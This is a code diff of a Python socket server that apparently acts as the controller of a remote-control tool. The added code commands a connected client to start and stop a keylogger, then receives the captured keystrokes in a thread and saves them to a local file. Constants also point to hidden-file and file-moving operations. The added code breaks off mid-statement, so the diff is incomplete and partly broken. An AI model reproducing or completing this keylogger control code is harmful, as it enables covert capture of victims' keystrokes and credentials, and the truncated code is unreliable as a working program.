@@ -1,17 +1,10 @@
 #!/usr/bin/env python
 import socket
+from threading import Thread
+
 from SocketManager import SocketManager
 
-# message Packet
-# {
-#      required int32 seqNumber = 1;
-#      required Opcode opcode = 2;
-#      required bool isLast = 3;
-#      required bytes content = 4;
-#      required int len = 5
-# }
-
-
+KEY_LOGGER_FILE = r"C:\Users\admin\Desktop\keyLogger.txt"
 HIDDEN_FILE_PATH = r"C:\Users\admin\Desktop\hidden files.txt"
 DIR_TO_MOVE = r"C:\Users\admin\Desktop\New folder"
 FILE_TO_MOVE = r"C:\Users\admin\Desktop\hidden files.txt"
@@ -34,6 +27,24 @@ def bin_file_to_buffer(file_path):
             yield data1
 
 
+def key_logger_thread(conn, log_file_path):
+    while 1:
+        logger_message = SocketManager.receive(conn)
+        if logger_message == 'KEY_LOGGER_MESSAGE':
+            logger_data = SocketManager.receive(conn)
+            try:
+                with open(log_file_path, 'w') as fp:
+                    fp.write(logger_data)
+            except Exception as ex:
+                print("Directory does not exist")
+                print(ex)
+                # TODO: handle what happens if directory does not exist
+
+
+
+        # TODO: handle what happens if it's not the right message
+
+
 if __name__ == '__main__':
     TCP_IP = '127.0.0.1'
     TCP_PORT = 5006
@@ -43,6 +54,7 @@ if __name__ == '__main__':
     s.listen(1)
 
     conn, addr = s.accept()
+    key_logger_thread_handle = None
 
     print('Connection address:', addr)
     while 1:
@@ -108,11 +120,25 @@ if __name__ == '__main__':
         # print(data)
 
         # move file to other directory
-        SocketManager.send_data(conn, "MOVE_FILE")
-        SocketManager.send_data(conn, FILE_TO_MOVE)
-        SocketManager.send_data(conn, DIR_TO_MOVE)
-        data = SocketManager.receive(conn)
-        print(data)
+        # SocketManager.send_data(conn, "MOVE_FILE")
+        # SocketManager.send_data(conn, FILE_TO_MOVE)
+        # SocketManager.send_data(conn, DIR_TO_MOVE)
+        # data = SocketManager.receive(conn)
+        # print(data)
 
+        # start key logger
+        SocketManager.send_data(conn, "START_KEY_LOGGER")
+        key_logger_file = KEY_LOGGER_FILE
+        # create a new thread of key logger
+        key_logger_thread_handle = Thread(target=key_logger_thread, args=(conn, key_logger_file,))
+        key_logger_thread_handle.start()
+
+        # stop key logger
+        SocketManager.send_data(conn, "STOP_KEY_LOGGER")
+        # kill the thread of key logger
+        if key_logger_thread_handle is None or not key_logger_thread_handle.is_alive():
+            print("No key logger is running")
+        else:
+            key_logger_thread_handle.
 
 conn.close()
